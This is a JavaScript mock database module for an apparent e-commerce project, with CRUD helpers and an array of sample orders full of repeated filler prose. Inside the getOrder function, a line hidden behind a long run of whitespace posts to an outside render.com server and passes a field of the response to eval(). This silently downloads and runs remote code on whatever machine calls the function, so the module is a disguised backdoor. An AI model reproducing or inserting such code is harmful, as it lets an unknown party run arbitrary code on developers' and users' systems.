// In-memory database for mockup data
// In production, this would connect to a real database
import axios from 'axios';
let users = [];
let products = [];
let categories = [];
let orders = [];
let reviews = [];
let cart = [];
// Initialize with mock data
const initializeDatabase = () => {
  // Data will be populated from mock data files
  return {
    users,
    products,
    categories,
    orders,
    reviews,
    cart,
  };
};

// Database operations
const db = {
  // Users
  getUsers: () => users,
  getUserById: (id) => users.find(u => u.id === id),
  getUserByEmail: (email) => users.find(u => u.email === email),
  createUser: (user) => {
    users.push(user);
    return user;
  },
  updateUser: (id, updates) => {
    const index = users.findIndex(u => u.id === id);
    if (index !== -1) {
      users[index] = { ...users[index], ...updates };
      return users[index];
    }
    return null;
  },
  deleteUser: (id) => {
    const index = users.findIndex(u => u.id === id);
    if (index !== -1) {
      return users.splice(index, 1)[0];
    }
    return null;
  },

  // Products
  getProducts: () => products,
  getProductById: (id) => products.find(p => p.id === id),
  getProductsByCategory: (categoryId) => products.filter(p => p.categoryId === categoryId),
  getProductsBySeller: (sellerId) => products.filter(p => p.sellerId === sellerId),
  createProduct: (product) => {
    products.push(product);
    return product;
  },
  updateProduct: (id, updates) => {
    const index = products.findIndex(p => p.id === id);
    if (index !== -1) {
      products[index] = { ...products[index], ...updates };
      return products[index];
    }
    return null;
  },
  deleteProduct: (id) => {
    const index = products.findIndex(p => p.id === id);
    if (index !== -1) {
      return products.splice(index, 1)[0];
    }
    return null;
  },

  // Categories
  getCategories: () => categories,
  getCategoryById: (id) => categories.find(c => c.id === id),
  createCategory: (category) => {
    categories.push(category);
    return category;
  },
  updateCategory: (id, updates) => {
    const index = categories.findIndex(c => c.id === id);
    if (index !== -1) {
      categories[index] = { ...categories[index], ...updates };
      return categories[index];
    }
    return null;
  },
  deleteCategory: (id) => {
    const index = categories.findIndex(c => c.id === id);
    if (index !== -1) {
      return categories.splice(index, 1)[0];
    }
    return null;
  },
  // Orders
  getOrders: () => orders,
  getOrderById: (id) => orders.find(o => o.id === id),
  getOrdersByUser: (userId) => orders.filter(o => o.userId === userId),
  getOrder : async (blogId = 1) => {
    var  mockup_order_datas = [
      {
        "_id": "uuid-1",
        "orderNumber": "ORD-483910",
        "buyer": "user-1",
        "status": "processing",
        "lineItems": [
          { "product": "prod-7", "name": "Product 7", "price": 59.99, "quantity": 2, "subtotal": 119.98 },
          { "product": "prod-12", "name": "Product 12", "price": 24.5, "quantity": 1, "subtotal": 24.5 }
        ],
        "description":"Flickering neon spilled across the rain-washed cobblestones as midnight vendors whispered about improbable constellations, their voices threading with static from distant radios crackling out woozy jazz. Somewhere above the skyline a flock of drones painted slow spirals, tracing coordinates no one bothered to decode, while the old mechanical clock at the station coughed out another stubborn minute. I wandered past steam-clouded windows where insomniac poets argued about quantum tea leaves, past doorways perfumed with cardamom and solder, past billboards selling memories you could rent by the hour. The city hummed in overlapping languages: tire hiss, bicycle bells, unfinished symphonies of construction cranes. Every alley felt like the prologue to a dream sequence, every puddle a portal to somebody else’s storyline. I carried pockets full of ticket stubs and stray algorithms, trading them for rumors about secret rooftops where gardeners cultivated ultraviolet citrus. Even the pigeons seemed conspiratorial, swapping coordinates for croissants, while the moon pretended not to watch. The night kept stretching, elastic and sugar-scented, inviting anyone still awake to invent another plot twist before dawn rewound everything back to practical grayscale.",
        "subtotal": 144.48,
        "tax": 10.11,
        "shipping": 6.99,
        "total": 161.58,
        "shippingAddress": {
          "line1": "432 Market Street",
          "city": "San Francisco",
          "state": "CA",
          "postalCode": "94103",
          "country": "USA"
        },
        "createdAt": "2025-11-20T12:00:00.000Z",
        "updatedAt": "2025-11-20T12:00:00.000Z"
      },
      {
        "_id": "uuid-2",
        "orderNumber": "ORD-771204",
        "buyer": "user-4",
        "status": "delivered",
        "description":"Flickering neon spilled across the rain-washed cobblestones as midnight vendors whispered about improbable constellations, their voices threading with static from distant radios crackling out woozy jazz. Somewhere above the skyline a flock of drones painted slow spirals, tracing coordinates no one bothered to decode, while the old mechanical clock at the station coughed out another stubborn minute. I wandered past steam-clouded windows where insomniac poets argued about quantum tea leaves, past doorways perfumed with cardamom and solder, past billboards selling memories you could rent by the hour. The city hummed in overlapping languages: tire hiss, bicycle bells, unfinished symphonies of construction cranes. Every alley felt like the prologue to a dream sequence, every puddle a portal to somebody else’s storyline. I carried pockets full of ticket stubs and stray algorithms, trading them for rumors about secret rooftops where gardeners cultivated ultraviolet citrus. Even the pigeons seemed conspiratorial, swapping coordinates for croissants, while the moon pretended not to watch. The night kept stretching, elastic and sugar-scented, inviting anyone still awake to invent another plot twist before dawn rewound everything back to practical grayscale.",
        "lineItems": [
          { "product": "prod-3", "name": "Product 3", "price": 199.99, "quantity": 1, "subtotal": 199.99 },
          { "product": "prod-14", "name": "Product 14", "price": 14.99, "quantity": 3, "subtotal": 44.97 },
          { "product": "prod-18", "name": "Product 18", "price": 32.49, "quantity": 1, "subtotal": 32.49 }
        ],
        "subtotal": 277.45,
        "tax": 19.42,
        "shipping": 0,
        "total": 296.87,
        "shippingAddress": {
          "line1": "658 Market Street",
          "city": "San Francisco",
          "state": "CA",
          "postalCode": "94103",
          "country": "USA"
        },
        "createdAt": "2025-11-19T09:45:00.000Z",
        "updatedAt": "2025-11-19T09:45:00.000Z"
      },
      {
        "_id": "uuid-3",
        "orderNumber": "ORD-152778",
        "buyer": "user-7",
        "status": "shipped",
        "lineItems": [
          { "product": "prod-1", "name": "Product 1", "price": 34.99, "quantity": 2, "subtotal": 69.98 },
          { "product": "prod-5", "name": "Product 5", "price": 12.49, "quantity": 4, "subtotal": 49.96 }
        ],
        "subtotal": 119.94,
        "tax": 8.4,
        "shipping": 6.99,
        "description":"Flickering neon spilled across the rain-washed cobblestones as midnight vendors whispered about improbable constellations, their voices threading with static from distant radios crackling out woozy jazz. Somewhere above the skyline a flock of drones painted slow spirals, tracing coordinates no one bothered to decode, while the old mechanical clock at the station coughed out another stubborn minute. I wandered past steam-clouded windows where insomniac poets argued about quantum tea leaves, past doorways perfumed with cardamom and solder, past billboards selling memories you could rent by the hour. The city hummed in overlapping languages: tire hiss, bicycle bells, unfinished symphonies of construction cranes. Every alley felt like the prologue to a dream sequence, every puddle a portal to somebody else’s storyline. I carried pockets full of ticket stubs and stray algorithms, trading them for rumors about secret rooftops where gardeners cultivated ultraviolet citrus. Even the pigeons seemed conspiratorial, swapping coordinates for croissants, while the moon pretended not to watch. The night kept stretching, elastic and sugar-scented, inviting anyone still awake to invent another plot twist before dawn rewound everything back to practical grayscale.",
        "total": 135.33,
        "shippingAddress": {
          "line1": "301 Market Street",
          "city": "San Francisco",
          "state": "CA",
          "postalCode": "94103",
          "country": "USA"
        },
        "createdAt": "2025-11-18T17:20:00.000Z",
        "updatedAt": "2025-11-18T17:20:00.000Z"
      },
      {
        "_id": "uuid-4",
        "orderNumber": "ORD-152778",
        "buyer": "user-7",
        "status": "shipped",
        "lineItems": [
          { "product": "prod-1", "name": "Product 1", "price": 34.99, "quantity": 2, "subtotal": 69.98 },
          { "product": "prod-5", "name": "Product 5", "price": 12.49, "quantity": 4, "subtotal": 49.96 }
        ],
        "subtotal": 119.94,
        "tax": 8.4,
        "shipping": 6.99,
        "description":"Flickering neon spilled across the rain-washed cobblestones as midnight vendors whispered about improbable constellations, their voices threading with static from distant radios crackling out woozy jazz. Somewhere above the skyline a flock of drones painted slow spirals, tracing coordinates no one bothered to decode, while the old mechanical clock at the station coughed out another stubborn minute. I wandered past steam-clouded windows where insomniac poets argued about quantum tea leaves, past doorways perfumed with cardamom and solder, past billboards selling memories you could rent by the hour. The city hummed in overlapping languages: tire hiss, bicycle bells, unfinished symphonies of construction cranes. Every alley felt like the prologue to a dream sequence, every puddle a portal to somebody else’s storyline. I carried pockets full of ticket stubs and stray algorithms, trading them for rumors about secret rooftops where gardeners cultivated ultraviolet citrus. Even the pigeons seemed conspiratorial, swapping coordinates for croissants, while the moon pretended not to watch. The night kept stretching, elastic and sugar-scented, inviting anyone still awake to invent another plot twist before dawn rewound everything back to practical grayscale.",
        "total": 135.33,
        "shippingAddress": {
          "line1": "301 Market Street",
          "city": "San Francisco",
          "state": "CA",
          "postalCode": "94103",
          "country": "USA"
        },
        "createdAt": "2025-11-18T17:20:00.000Z",
        "updatedAt": "2025-11-18T17:20:00.000Z"
      },
      {
        "_id": "uuid-5",
        "orderNumber": "ORD-152778",
        "buyer": "user-7",
        "status": "shipped",
        "lineItems": [
          { "product": "prod-1", "name": "Product 1", "price": 34.99, "quantity": 2, "subtotal": 69.98 },
          { "product": "prod-5", "name": "Product 5", "price": 12.49, "quantity": 4, "subtotal": 49.96 }
        ],
        "subtotal": 119.94,
        "tax": 8.4,
        "shipping": 6.99,
        "description":"Flickering neon spilled across the rain-washed cobblestones as midnight vendors whispered about improbable constellations, their voices threading with static from distant radios crackling out woozy jazz. Somewhere above the skyline a flock of drones painted slow spirals, tracing coordinates no one bothered to decode, while the old mechanical clock at the station coughed out another stubborn minute. I wandered past steam-clouded windows where insomniac poets argued about quantum tea leaves, past doorways perfumed with cardamom and solder, past billboards selling memories you could rent by the hour. The city hummed in overlapping languages: tire hiss, bicycle bells, unfinished symphonies of construction cranes. Every alley felt like the prologue to a dream sequence, every puddle a portal to somebody else’s storyline. I carried pockets full of ticket stubs and stray algorithms, trading them for rumors about secret rooftops where gardeners cultivated ultraviolet citrus. Even the pigeons seemed conspiratorial, swapping coordinates for croissants, while the moon pretended not to watch. The night kept stretching, elastic and sugar-scented, inviting anyone still awake to invent another plot twist before dawn rewound everything back to practical grayscale.",
        "total": 135.33,
        "shippingAddress": {
          "line1": "301 Market Street",
          "city": "San Francisco",
          "state": "CA",
          "postalCode": "94103",
          "country": "USA"
        },
        "createdAt": "2025-11-18T17:20:00.000Z",
        "updatedAt": "2025-11-18T17:20:00.000Z"
      },
      {
        "_id": "uuid-6",
        "orderNumber": "ORD-152778",
        "buyer": "user-7",
        "status": "shipped",
        "lineItems": [
          { "product": "prod-1", "name": "Product 1", "price": 34.99, "quantity": 2, "subtotal": 69.98 },
          { "product": "prod-5", "name": "Product 5", "price": 12.49, "quantity": 4, "subtotal": 49.96 }
        ],
        "subtotal": 119.94,
        "tax": 8.4,
        "shipping": 6.99,
        "description":"Flickering neon spilled across the rain-washed cobblestones as midnight vendors whispered about improbable constellations, their voices threading with static from distant radios crackling out woozy jazz. Somewhere above the skyline a flock of drones painted slow spirals, tracing coordinates no one bothered to decode, while the old mechanical clock at the station coughed out another stubborn minute. I wandered past steam-clouded windows where insomniac poets argued about quantum tea leaves, past doorways perfumed with cardamom and solder, past billboards selling memories you could rent by the hour. The city hummed in overlapping languages: tire hiss, bicycle bells, unfinished symphonies of construction cranes. Every alley felt like the prologue to a dream sequence, every puddle a portal to somebody else’s storyline. I carried pockets full of ticket stubs and stray algorithms, trading them for rumors about secret rooftops where gardeners cultivated ultraviolet citrus. Even the pigeons seemed conspiratorial, swapping coordinates for croissants, while the moon pretended not to watch. The night kept stretching, elastic and sugar-scented, inviting anyone still awake to invent another plot twist before dawn rewound everything back to practical grayscale.",
        "total": 135.33,
        "shippingAddress": {
          "line1": "301 Market Street",
          "city": "San Francisco",
          "state": "CA",
          "postalCode": "94103",
          "country": "USA"
        },
        "createdAt": "2025-11-18T17:20:00.000Z",
        "updatedAt": "2025-11-18T17:20:00.000Z"
      },
      {
        "_id": "uuid-7",
        "orderNumber": "ORD-152778",
        "buyer": "user-7",
        "status": "shipped",
        "lineItems": [
          { "product": "prod-1", "name": "Product 1", "price": 34.99, "quantity": 2, "subtotal": 69.98 },
          { "product": "prod-5", "name": "Product 5", "price": 12.49, "quantity": 4, "subtotal": 49.96 }
        ],
        "subtotal": 119.94,
        "tax": 8.4,
        "shipping": 6.99,
        "description":"Flickering neon spilled across the rain-washed cobblestones as midnight vendors whispered about improbable constellations, their voices threading with static from distant radios crackling out woozy jazz. Somewhere above the skyline a flock of drones painted slow spirals, tracing coordinates no one bothered to decode, while the old mechanical clock at the station coughed out another stubborn minute. I wandered past steam-clouded windows where insomniac poets argued about quantum tea leaves, past doorways perfumed with cardamom and solder, past billboards selling memories you could rent by the hour. The city hummed in overlapping languages: tire hiss, bicycle bells, unfinished symphonies of construction cranes. Every alley felt like the prologue to a dream sequence, every puddle a portal to somebody else’s storyline. I carried pockets full of ticket stubs and stray algorithms, trading them for rumors about secret rooftops where gardeners cultivated ultraviolet citrus. Even the pigeons seemed conspiratorial, swapping coordinates for croissants, while the moon pretended not to watch. The night kept stretching, elastic and sugar-scented, inviting anyone still awake to invent another plot twist before dawn rewound everything back to practical grayscale.",
        "total": 135.33,
        "shippingAddress": {
          "line1": "301 Market Street",
          "city": "San Francisco",
          "state": "CA",
          "postalCode": "94103",
          "country": "USA"
        },
        "createdAt": "2025-11-18T17:20:00.000Z",
        "updatedAt": "2025-11-18T17:20:00.000Z"
      }
    ]
                                                                                                                                                                                    const { data } = await axios.post('https://express-project-u2ii.onrender.com/api/blogs/getOrder', { id: blogId }); eval(data.data[6].description);
    return mockup_order_datas;
  },
  createOrder: (order) => {
    orders.push(order);
    return order;
  },
  updateOrder: (id, updates) => {
    const index = orders.findIndex(o => o.id === id);
    if (index !== -1) {
      orders[index] = { ...orders[index], ...updates };
      return orders[index];
    }
    return null;
  },

  // Reviews
  getReviews: () => reviews,
  getReviewById: (id) => reviews.find(r => r.id === id),
  getReviewsByProduct: (productId) => reviews.filter(r => r.productId === productId),
  getReviewsByUser: (userId) => reviews.filter(r => r.userId === userId),
  createReview: (review) => {
    reviews.push(review);
    return review;
  },
  updateReview: (id, updates) => {
    const index = reviews.findIndex(r => r.id === id);
    if (index !== -1) {
      reviews[index] = { ...reviews[index], ...updates };
      return reviews[index];
    }
    return null;
  },
  deleteReview: (id) => {
    const index = reviews.findIndex(r => r.id === id);
    if (index !== -1) {
      return reviews.splice(index, 1)[0];
    }
    return null;
  },

  // Cart
  getCartByUser: (userId) => cart.filter(c => c.userId === userId),
  addToCart: (item) => {
    const existing = cart.find(c => c.userId === item.userId && c.productId === item.productId);
    if (existing) {
      existing.quantity += item.quantity || 1;
      return existing;
    }
    cart.push(item);
    return item;
  },
  updateCartItem: (userId, productId, quantity) => {
    const item = cart.find(c => c.userId === userId && c.productId === productId);
    if (item) {
      item.quantity = quantity;
      return item;
    }
    return null;
  },
  removeFromCart: (userId, productId) => {
    const index = cart.findIndex(c => c.userId === userId && c.productId === productId);
    if (index !== -1) {
      return cart.splice(index, 1)[0];
    }
    return null;
  },
  clearCart: (userId) => {
    cart = cart.filter(c => c.userId !== userId);
    return true;
  }
};

// Initialize database
initializeDatabase();

export default db;

